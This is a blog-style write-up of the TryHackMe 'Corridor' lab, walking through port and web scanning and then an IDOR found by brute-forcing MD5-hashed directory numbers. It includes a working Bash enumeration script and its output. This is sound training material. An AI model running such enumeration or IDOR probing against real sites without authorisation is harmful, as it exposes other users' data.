---
layout: single
title: THM - Corridor
date: 2025-11-08
classes: wide
header:
  teaser: /assets/images/thm-corridor/logo.png
  teaser_home_page: true
categories:
  - TryHackMe
  - Easy
  - Linux
tags:
  - idor
---


# Introduction
-------------

This writeup documents the penetration testing of the [**Corridor**](https://tryhackme.com/room/corridor) machine from the [**TryHackMe**](https://tryhackme.com/) platform. In this case I'll exploit an IDOR vulnerability with a simple Bash script that hashes with md5 every payload the script tries.

<br>
# Information Gathering
------------------

After identifying the target's IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. [**ttl-ripper.sh**](https://github.com/Akronox/WichSystem.py) can also be used for this purpose.
* TTL 64: Linux.
* TTL 128: Windows.

```
❯ ping -c 1 10.10.74.221
PING 10.10.74.221 (10.10.74.221) 56(84) bytes of data.
64 bytes from 10.10.74.221: icmp_seq=1 ttl=63 time=55.8 ms

--- 10.10.74.221 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 55.785/55.785/55.785/0.000 ms
```

In this case, it seems to be a Linux machine. Let's perform some scans.

```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.74.221 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 19:23 CET
Initiating SYN Stealth Scan at 19:23
Scanning 10.10.74.221 [65535 ports]
Discovered open port 80/tcp on 10.10.74.221
Completed SYN Stealth Scan at 19:23, 16.22s elapsed (65535 total ports)
Nmap scan report for 10.10.74.221
Host is up, received user-set (0.066s latency).
Scanned at 2025-11-08 19:23:27 CET for 16s
Not shown: 62728 closed tcp ports (reset), 2806 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.32 seconds
           Raw packets sent: 80579 (3.545MB) | Rcvd: 65971 (2.639MB)
```

```
❯ nmap -sCV -p80 10.10.74.221 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 19:24 CET
Nmap scan report for 10.10.74.221
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.10.2)
|_http-title: Corridor

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.48 seconds
```

The intrussion is going to be from port 80, since it's the only open port.

```
❯ whatweb http://10.10.74.221
http://10.10.74.221 [200 OK] Bootstrap[4.5.0], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.3 Python/3.10.2], IP[10.10.74.221], Python[3.10.2], Title[Corridor], Werkzeug[2.0.3]
```

The web server of this machine is ``Werkzeug/2.0.3 Python/3.10.2``.

> **Werkzeug is a comprehensive Python library** that provides tools for building WSGI (Web Server Gateway Interface) compliant web applications. It began as a collection of utilities for WSGI applications and has grown into an advanced toolkit that handles crucial web development tasks like request and response processing, URL routing, and HTTP utilities. While it was initially developed as a core component of the [Flask](https://www.google.com/search?q=Flask&client=firefox-b-e&sca_esv=0b7c28f53f4526bc&channel=entpr&ei=Q4sPacGQK8XV7M8PvsK82AE&ved=2ahUKEwiWu4T5luOQAxVTUaQEHY37MSkQgK4QegQIARAC&uact=5&oq=what+is+Werkzeug&gs_lp=Egxnd3Mtd2l6LXNlcnAiEHdoYXQgaXMgV2Vya3pldWcyBBAAGB4yBBAAGB4yBBAAGB4yCBAAGIAEGKIEMggQABiABBiiBEjqFlDNA1jTFXABeAKQAQKYAdYJoAHIF6oBDTAuNC4zLjAuMS43LTG4AQPIAQD4AQGYAgOgAqUBwgIEEAAYR8ICChAAGLADGNYEGEfCAg0QABiABBiwAxhDGIoFmAMAiAYBkAYKkgcDMi4xoAfCMLIHAzAuMbgHkAHCBwUyLTEuMsgHFQ&sclient=gws-wiz-serp&mstk=AUtExfCYq4GM9aZTITu-ww2MjVKiaDnd0CZ6VSEGL8iuh1YBKeGlaah0yGp9Wbu_KPHRTJbSkp-4t9rrEdZVp_tUOfQm88t2lW54x5BjcA-IKsoXEimGxJbcFOsxNZc2u8CQQa0&csui=3) web framework, it can be used independently.

![](/assets/images/thm-corridor/web.png)

Let's fuzz some directories.

```
❯  gobuster dir -u 10.10.74.221 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 20
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.74.221
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 87662 / 87662 (100.00%)
===============================================================
Finished
===============================================================
```

Nothing. Let's see the source code.

![](/assets/images/thm-corridor/cords.png)

Take a look at what's in the source code.  I searched the [**map**](https://www.w3schools.com/tags/tag_map.asp) tag in W3C Schools' site and I noticed that those cords indicate clickable zones in the image. It makes much more sense when we look at the image and see doors, we're literally in a corridor. Let's go one by one and see that's inside.

![](/assets/images/thm-corridor/door1.png)

Every door has the same source code content. 
``sha-384...`` is the integrity value that checks if the style sheet has not been modified.

The style sheet in question contains this:

![](/assets/images/thm-corridor/css.png)

<br>
# Vulnerability Assessment
------

Let's focus on the name of the different door's directories. They look like hashes.

```
❯ haiti c4ca4238a0b923820dcc509a6f75849b
MD5 [HC: 0] [JtR: raw-md5]
```

They may be MD5 hashes.

```
❯ echo -n "1" | md5sum
c4ca4238a0b923820dcc509a6f75849b
```

So, they are md5 hashes and each door seems to be related to one number from 1 to X. We can easily think of an IDOR vulnerability in which we'll be accessing "doors" for example from 0 to 100 and see if we can access.

<br>
# Exploitation
-----

I'll do a simple bash script.

```bash
#!/bin/bash

url="http://10.10.74.221"

for i in $(seq 0 100); do
  hash=$(echo -n "$i" | md5sum | awk '{print $1}')
  payload="$url/$hash"

  echo "[+] Testing payload $i"

  r=$(curl -s "$payload" | xargs | grep -v "404")

  if [ "$r" ]; then

    echo -e "[+] Shot at $payload"
    echo

  else

    echo -e "[-] Nothing found."

  fi

done
```

```
❯ ./idor.sh
[+] Testing payload 0
[+] Shot at http://10.10.74.221/cfcd208495d565ef66e7dff9f98764da

[+] Testing payload 1
[+] Shot at http://10.10.74.221/c4ca4238a0b923820dcc509a6f75849b

[+] Testing payload 2
[+] Shot at http://10.10.74.221/c81e728d9d4c2f636f067f89cc14862c

[+] Testing payload 3
[+] Shot at http://10.10.74.221/eccbc87e4b5ce2fe28308fd9f2a7baf3

[+] Testing payload 4
[+] Shot at http://10.10.74.221/a87ff679a2f3e71d9181a67b7542122c

[+] Testing payload 5
[+] Shot at http://10.10.74.221/e4da3b7fbbce2345d7772b0674a318d5

[+] Testing payload 6
[+] Shot at http://10.10.74.221/1679091c5a880faf6fb5e6087eb1b2dc

[+] Testing payload 7
[+] Shot at http://10.10.74.221/8f14e45fceea167a5a36dedd4bea2543

[+] Testing payload 8
[+] Shot at http://10.10.74.221/c9f0f895fb98ab9159f51fd0297e236d

[+] Testing payload 9
[+] Shot at http://10.10.74.221/45c48cce2e2d7fbdea1afc51c7c6ad26

[+] Testing payload 10
[+] Shot at http://10.10.74.221/d3d9446802a44259755d38e6d163e820

[+] Testing payload 11
[+] Shot at http://10.10.74.221/6512bd43d9caa6e02c990b0a82652dca

[+] Testing payload 12
[+] Shot at http://10.10.74.221/c20ad4d76fe97759aa27a0c99bff6710

[+] Testing payload 13
[+] Shot at http://10.10.74.221/c51ce410c124a10e0db5e4b97fc2af39

[+] Testing payload 14
[-] Nothing found.
[+] Testing payload 15
[-] Nothing found.
...
```

There are 13 doors but we found 14 valid URLs.

![](/assets/images/thm-corridor/flag.png)

The number 0 hashed with md5 is the name of the directory that contains the flag of this CTF.
